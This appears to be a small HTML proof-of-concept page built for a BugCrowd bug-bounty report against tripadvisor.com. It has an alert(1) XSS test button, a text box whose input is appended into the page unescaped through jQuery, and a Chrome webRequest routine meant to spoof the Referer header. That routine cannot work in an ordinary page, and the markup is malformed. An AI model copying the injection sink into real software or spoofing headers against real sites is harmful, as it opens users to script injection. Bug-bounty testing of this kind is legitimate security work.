<!DOCTYPE html>
<html>
<head>
<title> Search Projects </title>
</head>

<body>
<h1> Just another test for this page </h1>
<p1> This will be a test for an XSS polygot </p1>
  <p1>If you are here for my report on BugCrowd the link you are looking for is right below!</p1>
<br>
<br>
  
<script>
function mario1(){
alert(1);
}
</script>
  <a href="https://www.tripadvisor.com/MediaKit">Click Me!</a>
<br>
  <br>
<button type="button" onclick="mario1()">Test XSS</button>
  
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js">
    </script>
  </head>
  <body>  
    <div class="info">
      <label for="example">Enter Text
      </label>
      <input id="example" type="text"
             name="Ntext" size="20">
      <input id="sent" type="submit"  
             value="Send"> 
  </div>
    <p id="para">      
    </p>
  </body>
  <script>
    window.onclick = function(e)
    {   var id =  e.target.id;   
     if (id === 'sent')  
     { var txt = document.getElementById('example').value    
       $( "#para" ).empty().append( txt );
     }
    }
  </script>
  <br>
  <br>
  <button onclick="myFunction()">Load new document</button>

<script>
function myFunction() {
  location.assign("https://www.tripadvisor.com/mediakit");

   chrome.webRequest.onBeforeSendHeaders.addEventListener(function(details){
    var newRef = "http://mariomejia127.github.io/search.html?hello";
    var hasRef = false;
    for(var n in details.requestHeaders){
        hasRef = details.requestHeaders[n].name == "Referer";
        if(hasRef){
            details.requestHeaders[n].value = newRef;
         break;
        }
    }
    if(!hasRef){
        details.requestHeaders.push({name:"Referer",value:newRef});
    }
    return {requestHeaders:details.requestHeaders};
},
{
    urls:["http://tripadvisor.com/mediakit"]
},
[
    "requestHeaders",
    "blocking"
]);
}
</script>
<br>
</body>

</html>
